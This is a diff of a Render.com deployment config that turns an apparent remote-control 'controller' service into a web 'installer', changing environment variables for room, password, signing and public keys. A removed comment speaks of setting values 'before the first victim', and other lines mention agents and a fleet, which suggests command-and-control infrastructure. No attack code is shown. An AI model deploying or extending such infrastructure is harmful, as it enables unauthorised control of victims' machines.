@@ -1,45 +1,27 @@
 services:
   - type: web
-    name: syspy-controller
+    name: syspy-installer
     runtime: python
     plan: free
     buildCommand: pip install -r requirements.txt
     startCommand: python controller.py --host 0.0.0.0 --no-browser
     healthCheckPath: /api/health
-    # ---------------------------------------------------------------------
-    # A Render disk needs a paid plan, but SYSPY_DATA MUST be persistent.
-    # On the free tier /opt/render/project/src/data is wiped on every deploy,
-    # which rotates the dashboard password, invalidates every session and
-    # throws away agents_db.json (nicknames, groups, tree). Move to
-    # plan: starter and mount a disk at /var/data, then set
-    #   SYSPY_DATA=/var/data
-    # ---------------------------------------------------------------------
     envVars:
       - key: PYTHON_VERSION
         value: "3.12.8"
+      - key: SYSPY_MODE
+        value: "webinstall"
       - key: SYSPY_HOST
         value: 0.0.0.0
-      - key: SYSPY_CLIENT_ID
-        value: syspy-controller-1
-      - key: SYSPY_DATA
-        value: /opt/render/project/src/data
-      - key: SYSPY_TRUST_PROXY_HOPS   # Render puts exactly one proxy in front
+      - key: SYSPY_TRUST_PROXY_HOPS
         value: "1"
-      - key: SYSPY_PASSWORD           # else a new random password every boot
+      - key: SYSPY_URL                # Controller VPS Base URL: e.g. https://dashboard.yourdomain.com
         sync: false
-      - key: SYSPY_URL                # https://<app>.onrender.com
+      - key: SYSPY_ROOM               # Must match VPS SYSPY_ROOM
         sync: false
-      - key: SYSPY_ROOM               # set BEFORE the first victim, never change
+      - key: SYSPY_PASS               # Must match VPS SYSPY_PASS
         sync: false
-      - key: SYSPY_PASS               # same
+      - key: SYSPY_SIGN_KEY           # Controller signing key (optional on installer if PUBKEY is set)
         sync: false
-      - key: SYSPY_SIGN_KEY           # 64 hex chars; python patch.py --genkey
-        sync: false
-      - key: SYSPY_PUBKEY             # matching 64 hex chars, pin on agents
-        sync: false
-      - key: SYSPY_BROKER             # host:port:tls (self-hosted Mosquitto recommended)
-        sync: false
-      - key: SYSPY_BROKER_USER
-        sync: false
-      - key: SYSPY_BROKER_PASS
+      - key: SYSPY_PUBKEY             # Matching public key hex to pin on fleet
         sync: false
